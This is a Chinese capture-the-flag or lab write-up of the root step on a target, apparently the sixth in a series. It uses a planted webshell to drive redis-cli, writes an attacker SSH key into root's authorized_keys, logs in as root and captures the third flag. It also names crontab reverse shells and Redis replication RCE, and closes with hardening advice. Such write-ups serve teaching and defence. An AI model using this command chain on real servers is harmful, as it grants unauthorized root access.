# 06 Redis 提权与第三个 Flag

## 发现 Redis 服务

在拿到 WebShell 后，执行 `netstat -tlnp` 发现本机监听 6379 端口，确认存在 Redis 服务。

读取配置文件获取密码：
```bash
cat /etc/redis/redis.conf | grep -i requirepass
# requirepass redis***
```

## 确认 Redis 运行权限

通过执行写目录命令来测试，如果返回 OK，说明 Redis 有权限写入该目录。因为我们即将往 `/root/.ssh/` 写文件，能写入说明 Redis 是以 root 权限运行的。

## 利用 Redis 写入 SSH 公钥

### 第 1 步：Kali 生成 SSH 密钥对

```bash
ssh-keygen -t rsa -f /tmp/redis_key -N ""
cat /tmp/redis_key.pub
```

### 第 2 步：通过 WebShell 操作 Redis

```bash
PUBKEY=$(cat /tmp/redis_key.pub)
curl -s -G "http://x.x.x.x:800/uploads_test/shell.phar" \
  --data-urlencode "cmd=redis-cli -a redis*** config set dir /root/.ssh/ && redis-cli -a redis*** config set dbfilename authorized_keys && redis-cli -a redis*** set x '\n\n$PUBKEY\n\n' && redis-cli -a redis*** save"
```
预期返回 4 个 OK。

### 第 3 步：SSH 免密登录 root

```bash
ssh -i /tmp/redis_key root@x.x.x.x -p 222
whoami
# 回显：root
```

### 第 4 步：获取第三个 Flag

```bash
cat /root/flag
# 回显：flag{****}
```

## 经验总结

**1. Redis 提权原理是什么？**
Redis 默认以 root 权限运行，并且提供了 `config set dir`（设置写入目录）、`config set dbfilename`（设置写入文件名）、`save`（保存到磁盘）这几个命令。
攻击者可以：
- 把写入目录改到 `/root/.ssh/`
- 把文件名改成 `authorized_keys`
- 把自己的 SSH 公钥写入 Redis
- 执行 save，Redis 就会把公钥写入 `/root/.ssh/authorized_keys`
随后用私钥 SSH 登录，直接拿到 root。

**2. 为什么写公钥要前后加 `\n\n`？**
Redis 保存文件时使用的是 RDB 二进制格式，文件开头会有二进制头。如果在公钥前后不加换行，公钥会和二进制头挤在同一行，SSH 解析时无法识别。
加上 `\n\n` 后，公钥单独成行，SSH 就能正常读取。

**3. 如果 Redis 不是 root 运行怎么办？**
- 尝试写 WebShell 到 Web 目录（如果 Redis 用户对 Web 目录有写权限）。
- 尝试写 crontab 反弹 shell（写 `/var/spool/cron/crontabs/` 下对应用户的文件）。
- 如果 Redis 是 4.x/5.x 版本，尝试主从复制 RCE：伪造主节点，让目标 Redis 同步并加载恶意 `.so` 模块，从而执行系统命令（6.x 已修复此漏洞）。

**4. 防御建议**
- Redis 不要以 root 权限运行，使用专用的低权限用户。
- 设置强密码，不要使用弱口令。
- 禁用或重命名危险命令（如 `config`、`save` 等）。
- 限制 Redis 的监听地址，不要暴露在公网。
